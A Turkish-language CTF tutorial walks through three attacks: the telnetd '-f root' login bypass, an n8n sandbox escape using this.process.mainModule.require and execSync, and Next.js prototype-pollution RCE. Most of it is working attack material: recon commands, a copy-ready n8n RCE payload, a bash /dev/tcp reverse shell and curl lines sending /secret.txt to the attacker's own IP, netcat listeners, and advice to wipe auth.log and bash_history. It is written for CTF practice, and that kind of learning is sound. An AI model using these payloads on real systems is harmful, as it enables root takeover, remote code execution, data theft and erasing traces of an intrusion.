# Telnet Argument Injection — Sıfırdan Uzmanlığa Tam Rehber

> **Hedef Kitle:** Komut satırına yeni başlayandan CTF yarışmacısına kadar herkes.  
> **Felsefe:** "Komutu ezber öğrenme, mantığını anla. Mantığı anlayan her senaryoyu çözer."

---

## Bölüm 1: Zihinsel Model — "Güven Sınırı" Nedir?

Tüm siber güvenlik açıklarının kökünde tek bir kavram yatar: **Güven Sınırı İhlali (Trust Boundary Violation).**

Şöyle düşün: Bir banka veznedarı müşteriden para çekme formu alır ve arkadaki kasaya iletir. Banka, müşterinin forma sadece **rakam** yazacağına güvenir. Peki müşteri forma rakam yerine "Ve ayrıca tüm kasayı da ver" yazarsa ne olur?

Yazılımda da tam bu olur. Sistemler birbirine veri aktarırken, o verinin "temiz" olduğunu varsayar. Sen ise o veriye farklı bir anlam yüklersin.

**Telnet açığı bu mantığın mükemmel bir örneğidir.**

---

## Bölüm 2: Telnet Nasıl Çalışır? (Normal Senaryo)

Telnet, ağ üzerinden başka bir bilgisayara bağlanmana izin veren eski bir protokoldür. Bağlandığında senden kullanıcı adı ister.

```
[Sen]  →  telnet 192.168.1.1
[Sistem]  →  "login:"
[Sen]  →  "root"
[Sistem]  →  Arka planda çalıştırır: login root
[Sistem]  →  "password:"
[Sen]  →  "****"
[Sistem]  →  Giriş başarılı
```

Normal akış bu. Sistem senin `root` yazacağını **varsayar.** Peki ya farklı bir şey yazarsan?

---

## Bölüm 3: Zafiyet — Argument Injection

### Nedir Bu `-f` Parametresi?

`login` programı Linux'ta birkaç gizli parametreyi kabul eder. Bunlardan biri `-f` (force — zorla):

```bash
login -f root
# Anlamı: "root kullanıcısını zaten güvenilir bir servis doğruladı, parola sorma, direkt içeri al"
```

Bu parametre normalde güvenilir sistem servisleri (SSH, PAM gibi) tarafından kullanılır. **Sıradan bir kullanıcının bu parametreyi tetikleyebileceği hiç düşünülmemiş.**

### Zafiyet Tam Burada Patlıyor

```
[Sen]  →  telnet 192.168.1.1
[Sistem]  →  "login:"
[Sen]  →  "-f root"          ← Buraya parametre yazdık!
[Sistem]  →  Arka planda: login -f root
[Sistem]  →  "Parola? Hayır hayır, zaten doğrulandı. Buyur!" → ROOT ERİŞİMİ
```

Telnet servisi gelen girdiyi hiç filtrelemeden (sanitize etmeden) `login` programına ilettiği için, `login` programı bunu meşru bir sistem komutu olarak yorumladı.

**Altın Kural #1:**  
> "Bir program başka bir programa veri aktardığı her yer, potansiyel bir saldırı noktasıdır."

---

## Bölüm 4: Saldırı Adımları

### Adım 0: Keşif (Reconnaissance)

Önce hedef sistemi tanı. Körü körüne saldırmak zaman kaybıdır.

```bash
# Portları tara, servis versiyonlarını öğren
nmap -sV 172.20.74.101

# Beklenen çıktı:
# 23/tcp open  telnet  GNU Inetutils telnetd 2.0
```

Versiyon numarasını görür görmez şunu ara:

```bash
searchsploit telnetd 2.0
# veya
searchsploit "inetutils telnetd"
# veya Google: "GNU Inetutils telnetd 2.0 vulnerability"
```

### Adım 1: Bağlan

```bash
telnet 172.20.74.101
```

### Adım 2: Argument Injection Uygula

`login:` prompt'u gelince normal kullanıcı adı yerine şunu yaz:

```
-f root
```

```
Trying 172.20.74.101...
Connected to 172.20.74.101.
login: -f root
# Parola sormadan direkt giriş yapar
$ whoami
root
```

### Adım 3: Flag'i Bul

```bash
# Direkt bilinen path'e bak
cat /secret.txt

# Bilmiyorsan aramak için:
find / -name "*flag*" 2>/dev/null
find / -name "*secret*" 2>/dev/null
ls /root/
ls /home/
```

---

## Bölüm 5: CTF'de Bunu Nasıl Keşfederdin?

Yarışmada kimse sana "Argument Injection yap" demez. Sana sadece bir IP adresi verir. İşte gerçek düşünce süreci:

```
IP var → nmap tara → Port 23 açık (Telnet!)
                          ↓
                   Versiyon ne? → "GNU Inetutils telnetd 2.0"
                          ↓
                   searchsploit / Google → "Auth Bypass -f parametresi"
                          ↓
                   Dene → "-f root" → Root erişimi
                          ↓
                   find / -name "*flag*" → Flag!
```

**Altın Kural #2:**  
> "Versiyon numarasını bulduğun an, exploit'in yarısını bulmuşsun demektir."

---

## Bölüm 6: Kritik Tıkanma Noktaları ve Çözümleri

### Tıkanma 1: `-f root` çalışmadı

**Kontrol et:**
```bash
# Servise gerçekten bağlandın mı?
telnet -v 172.20.74.101

# Versiyon doğru mu?
nmap -sV -p 23 172.20.74.101
```

**Farklı kullanıcılar dene:**
```
-f bin
-f daemon  
-f www-data
-f operator
```

### Tıkanma 2: Bağlandım ama kabuk donuk / Tab çalışmıyor

Telnet bağlantılarında terminal genellikle "ham" gelir. Bunu düzelt:

```bash
# İçeri girdikten sonra hemen bunu çalıştır:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Veya:
/bin/bash -i
```

### Tıkanma 3: Flag yok, dosya yok

```bash
# Tüm sistemi tara
find / -name "*flag*" 2>/dev/null
find / -name "*secret*" 2>/dev/null
find / -name "*.txt" 2>/dev/null | head -20

# Root dizinine bak
ls -la /root/
cat /root/.bash_history  # Önceki komutlar ipucu verebilir
```

---

## Bölüm 7: Ezbere Bilmen Gereken 5 Komut

```bash
# 1. Versiyon tara
nmap -sV -p 23 HEDEF_IP

# 2. Bağlan ve inject et
telnet HEDEF_IP
# Prompt gelince: -f root

# 3. Terminal düzelt
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 4. Flag ara
find / -name "*flag*" 2>/dev/null

# 5. Flag oku
cat /secret.txt
```

---

---

# BONUS BÖLÜM: n8n Sandbox Escape (CVE Serisi)

> Aynı rehber kalitesinde, n8n zafiyeti için.

---

## 1. n8n Nedir ve Neden Hedef?

n8n, görsel "sürükle-bırak" arayüzüyle otomasyon iş akışları oluşturan bir araçtır. "Zapier'ın açık kaynak versiyonu" diyebiliriz. Genellikle şirket içi sunucularda 5678 portunda çalışır.

**CTF'de tanıma sinyalleri:**
- Port 5678 açık
- Tarayıcıda açınca görsel blok/akış editörü
- HTTP header'larında `n8n` ibaresi
- Versiyon 1.122.0'ın altı

---

## 2. Zihinsel Model: Sandbox Nedir, Neden Kaçılır?

Sandbox (Kum Havuzu): Bir programın sisteme zarar vermemesi için etrafına çekilen sanal duvar. Tarayıcıda çalışan JavaScript'in disk dosyalarına erişememesi gibi.

n8n'de de kullanıcıların yazdığı kod bir sandbox içinde çalışır. **Teorik olarak** sadece n8n değişkenlerine erişebilmeli.

**Ama bir açık var:** `this` anahtar kelimesi.

```
JavaScript'te this → global nesneye erişir
global nesne → process nesnesini içerir  
process nesnesi → Node.js'in kalbi, sisteme tam erişim sağlar
```

n8n bu zinciri kırmayı unutmuş. `this.process` engellenmiyor.

---

## 3. Exploit Payload — Parça Parça Açıklama

```javascript
{{ (function() {
    // ADIM 1: Node.js'in kütüphane yükleme fonksiyonunu çal
    // "require" normalde sandbox'ta yasak ama this üzerinden erişilebilir
    var require = this.process.mainModule.require; 
    
    // ADIM 2: Komut çalıştırma kütüphanesini yükle
    var execSync = require('child_process').execSync; 
    
    // ADIM 3: Sisteme istediğin komutu çalıştır
    return execSync('cat /secret.txt').toString(); 
})() }}
```

**Özelleştirme Tablosu:**

| Amaç | execSync içine yazılacak komut |
|---|---|
| Flag bul | `find / -name "*flag*" 2>/dev/null` |
| Dosya oku | `cat /secret.txt` |
| Sistem bilgisi | `id && whoami && uname -a` |
| Reverse shell | `bash -i >& /dev/tcp/SENIN_IP/PORT 0>&1` |
| Dışarı veri sızdır | `curl http://SENIN_IP:8080/?d=$(cat /secret.txt \| base64)` |

---

## 4. Kritik Tıkanma: "empty" veya "[undefined]" Hatası

**Bu bir hata değildir!**

n8n'de iki farklı çalıştırma modu var:

```
Önizleme Kutusu (Preview)  →  Güvenlik gereği kodu çalıştırmaz → "empty" der
Execute Butonu             →  Kodu sunucuda gerçekten çalıştırır → Output panelinde sonuç
```

Aldatıcı olan şu: Önizleme kutusu "empty" yazsa bile kod sunucuda çalışmış olabilir. Her zaman **"Execute Step"** veya **"Execute Workflow"** butonuna bas ve **sağdaki OUTPUT paneline** bak.

---

## 5. Blind RCE Durumu: Sonuç Ekrana Gelmiyorsa

Bazı CTF sunucuları korumalı olduğundan komutun çıktısını direkt sana göndermez (Blind RCE). Bu durumda **Out-of-Band (OOB)** tekniği kullanılır:

```bash
# Kendi makinende önce dinle
nc -lvnp 8080

# Payload içinde kendi IP'ne veri gönder
execSync('curl http://SENIN_IP:8080/?data=$(cat /secret.txt | base64)')

# Netcat'te şunu göreceksin:
# GET /?data=RmFsc3RhZmYK  ← base64 çöz
echo "RmFsc3RhZmYK" | base64 -d
# → Falstaff
```

---

---

# BONUS BÖLÜM 2: Next.js Prototype Pollution (CVE-2025-55182)

---

## 1. En Basit Mantık: "__proto__ Nedir?"

JavaScript'te her nesnenin bir "şablonu" vardır: `__proto__`. Yeni bir nesne oluşturulduğunda bu şablondan kopyalanır.

```javascript
// Normal:
let obj = {};
obj.__proto__.toString = function() { return "Merhaba"; }

// Artık TÜM nesneler "Merhaba" döndürür:
let obj2 = {};
obj2.toString(); // → "Merhaba"
```

**Prototype Pollution:** Şablonu kirletirsen, o şablondan türeyen tüm nesneler etkilenir. Sunucu yeni bir iş yaparken senin kirlettiğin şablonu kullanır ve senin kodunu çalıştırır.

---

## 2. Nasıl Tanırsın?

```
HTTP isteğinde → "Next-Action" header'ı var mı?
Kaynak kodda  → page.tsx, layout.tsx dosyaları var mı?
Next.js sürümü → 14, 15 veya 16 mı?
İstek gövdesinde → $1, @0, __proto__ gibi işaretler görüyor musun?
```

Bunların ikisi veya daha fazlası varsa → Prototype Pollution dene.

---

## 3. Keşif ve Doğrulama

```bash
# Sunucunun Server Action kabul edip etmediğini test et
curl -X POST http://HEDEF \
  -H "Next-Action: test123" \
  -H "Content-Type: text/plain"

# Eğer cevap "Action not found" veya 500 hatasıysa → Kapı aralık!
# Eğer 404 dönüyorsa → Bu özellik aktif değil
```

---

## 4. Out-of-Band Tekniği (CTF'de Standart)

Next.js RCE'leri genellikle Blind'dır. Şu akışı takip et:

```bash
# 1. Kendi IP'ni öğren
ip addr | grep "inet " | grep -v 127

# 2. Netcat ile dinle
nc -lvnp 8080

# 3. Payload içinde OOB kullan
bash -c 'curl http://SENIN_IP:8080/?x=$(cat /secret.txt | base64 -w0)'

# 4. Netcat'te gelen base64'ü çöz
echo "GELEN_BASE64" | base64 -d
```

---

## 5. "Phobos" / "Falstaff" Gibi Çıktıları Anlama

CTF'lerde flag bazen `flag{xyz}` formatında gelmez. Çıktıda tek kelime veya anlamsız görünen bir şey görürsen ve görevin "gizli dosyayı oku" ise — **bu zaten flag'dir.**

Kontrol et: Görev tanımında "/secret.txt oku" yazıyorsa ve çıktında "Phobos" varsa — cevabın Phobos'tur. Sade ve net.

---

---

# Tüm Saldırılar İçin Evrensel Düşünce Çerçevesi

```
ADIM 1 — TANI (Recognition)
└── Hangi teknoloji? Hangi port? Hangi versiyon?
└── nmap -sV HEDEF | searchsploit TEKNOLOJI_VERSIYON

ADIM 2 — ANLAMA (Understanding)  
└── Bu açık neden var? Güven sınırı nerede ihlal ediliyor?
└── Input mu filtrelenmiyor? Yetki mi kontrol edilmiyor? Prototype mı kirletiliyor?

ADIM 3 — UYGULAMA (Exploitation)
└── Minimal payload ile test et (önce id veya whoami gibi zararsız)
└── Çalıştığını doğrula, sonra asıl komutu çalıştır

ADIM 4 — DOĞRULAMA (Validation)
└── Komut çalıştı mı? Çıktı nerede? (stdout, dosya, OOB, HTTP response?)
└── 0 byte mi geldi? Blind mı? Log'a mı düştü?

ADIM 5 — TEMIZLIK (Cleanup — Gerçek Pentest'te)
└── iz bıraktın mı? /var/log/auth.log, bash_history temizle
└── CTF'de gerek yok ama bilgi olsun
```

---

## Karşılaştırma Tablosu: Hangi Açıkta Ne Yaparsın?

| Özellik | Telnet Arg Injection | n8n Sandbox Escape | Next.js Proto Pollution |
|---|---|---|---|
| **Port** | 23 | 5678 | 80/443/3000 |
| **Kategori** | Input Sanitization | Sandbox Escape | Prototype Pollution |
| **Araç** | telnet | Tarayıcı + n8n UI | curl / Burp Suite |
| **Payload tipi** | `-f root` (metin) | JavaScript kodu | JSON/binary veri |
| **Çıktı nerede?** | Terminalde direkt | OUTPUT paneli | OOB/curl/netcat |
| **Blind mı?** | Hayır | Hayır (görsel UI) | Genellikle evet |
| **Java gerekli mi?** | Hayır | Hayır | Hayır |

---

## Son Söz: Hacker Bakış Açısı

Her açık, bir programcının yaptığı **bir varsayım hatasıdır.**

- Telnet geliştiricisi varsaydı: "Kullanıcı sadece isim yazar."
- n8n geliştiricisi varsaydı: "`this` üzerinden process'e ulaşılamaz."
- Next.js geliştiricisi varsaydı: "Flight protokolü verisine güvenebiliriz."

**Senin işin:** Bu varsayımları bulmak ve yanlışlamak.

Bunu yaparken her zaman kendine şu soruyu sor:

> **"Bu sistem, gelen verinin ne olacağını varsayıyor? Ben ne girersem bu varsayımı bozarım?"**

Bu soruyu sormayı alışkanlık haline getirdiğinde, araçlar değişse bile, versiyonlar değişse bile — sen değişmezsin.

---

*Bu rehber eğitim ve CTF amaçlıdır. Yalnızca izin alınmış sistemlerde uygulayın.*
